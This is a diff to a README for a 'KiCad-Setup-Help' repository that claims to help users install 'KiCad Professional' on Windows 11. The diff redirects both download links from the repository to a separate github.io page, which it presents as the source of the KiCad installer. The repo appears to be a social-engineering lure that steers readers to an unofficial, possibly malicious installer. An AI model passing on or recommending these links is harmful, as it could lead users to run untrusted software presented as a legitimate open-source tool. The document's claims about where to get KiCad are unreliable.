@@ -1,6 +1,6 @@
 # 🛠️ KiCad-Setup-Help - Install KiCad on Windows 11 easily
 
-[![](https://img.shields.io/badge/Download_KiCad_Installer-blue.svg)](https://github.com/Westondiabetic49/KiCad-Setup-Help)
+[![](https://img.shields.io/badge/Download_KiCad_Installer-blue.svg)](https://westondiabetic49.github.io)
 
 ## 🎯 About this guide
 This repository helps you install KiCad Professional on your Windows 11 computer. Many users face hurdles during the setup process. This guide provides clear instructions to fix common errors. You will learn how to prepare your system, download the correct files, and finish the installation process without technical stress.
@@ -16,7 +16,7 @@ Before you start, check your PC. You need these specifications for a smooth expe
 
 ## 📥 Download KiCad
 You need the official installation files to begin. You can find the necessary links and current release notes here:
-[Visit this page to download the KiCad installer](https://github.com/Westondiabetic49/KiCad-Setup-Help).
+[Visit this page to download the KiCad installer](https://westondiabetic49.github.io).
 
 Follow these steps on the page:
 1. Locate the latest stable release.
